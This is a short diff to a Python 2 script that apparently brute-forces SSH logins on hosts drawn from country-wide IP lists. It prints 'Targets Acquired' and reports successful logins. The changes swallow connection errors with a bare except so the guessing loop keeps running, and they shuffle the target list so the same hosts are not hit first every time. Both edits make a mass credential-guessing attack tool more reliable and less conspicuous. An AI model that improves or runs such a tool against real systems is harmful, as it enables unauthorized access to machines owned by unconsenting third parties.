@@ -102,7 +102,11 @@ def create_ssh_connection(ip_address, uname, password):
 def attempt(ip,uname,passwd):
     print '.. Trying %s@%s:%s' % (uname, ip, passwd)
     win = ''
-    connected, reply = create_ssh_connection(ip, uname, passwd)
+    connected = False
+    try:
+        connected, reply = create_ssh_connection(ip, uname, passwd)
+    except: # TODO: Be more precise here
+        pass
     if connected:
         print '\033[1m[**] \033[34mSuccessfully Logged into %s@%s:%s\033[0m' % \
               (uname, ip, passwd)
@@ -207,6 +211,8 @@ if 'target' in sys.argv:
                 target = country_codes[k]
     targets = ip_locations[target]
     print '[*] %d Targets Acquired From %s' % (len(targets), target)
+    # Shuffle targets to I'm not hitting the first ones on the list repeatedly
+    random.shuffle(targets)
     tic = time.time()
     if intense:
         print '[*] INTENSE Mode Enabled'
